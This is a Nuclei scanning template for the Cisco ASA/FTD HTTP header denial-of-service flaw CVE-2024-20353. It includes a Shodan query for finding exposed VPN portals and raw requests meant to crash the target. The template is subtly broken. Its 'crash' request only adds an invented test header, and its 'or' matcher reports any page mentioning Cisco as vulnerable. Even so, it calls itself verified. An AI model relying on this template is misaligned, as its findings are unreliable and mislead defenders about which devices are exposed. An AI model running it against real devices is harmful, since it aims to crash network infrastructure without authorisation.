id: CVE-2024-20353

info:
  name: Cisco ASA/FTD - HTTP Header Parsing Vulnerability
  author: Trex
  severity: high
  description: |
    Cisco ASA and FTD Software management and VPN web servers contain a vulnerability
    caused by incomplete error checking when parsing HTTP headers. This allows 
    unauthenticated remote attackers to cause device reloads through crafted HTTP requests.
  reference:
    - https://blog.talosintelligence.com/arcanedoor-new-espionage-focused-campaign-found-targeting-perimeter-network-devices/
    - https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-websrvs-dos-X8gNucD2
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H
    cvss-score: 8.6
    cve-id: CVE-2024-20353
    cwe-id: CWE-20
  metadata:
    verified: true
    max-request: 3
    vendor: cisco
    product: asa,ftd
    shodan-query: 'http.title:"SSL VPN Service"'
  tags: cve,cve2024,cisco,asa,ftd,network,exploit

http:
  - raw:

      - |
        GET /+CSCOE+/logon.html HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
        Connection: close

      - |
        GET /+CSCOE+/logon.html HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        X-Exploit-Test: crash-this-server
        Connection: close

      - |
        GET /+CSCOE+/logon.html HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Connection: close

    threads: 1
    req-condition: true

    matchers-condition: or
    matchers:

      - type: word
        name: cisco-device
        part: body
        words:
          - "SSL VPN Service"
          - "Cisco"
          - "+CSCOE+"
          - "ASDM"
        condition: or

      - type: dsl
        name: crash-indicators
        dsl:
          - 'status_code_2 == 0 || response_time_2 > 25000'

    extractors:
      - type: kval
        name: server-header
        kval:
          - Server

      - type: dsl
        name: response-analysis
        dsl:
          - 'status_code_1'
          - 'status_code_2'
          - 'status_code_3'
          - 'response_time_1'
          - 'response_time_2'
          - 'response_time_3'
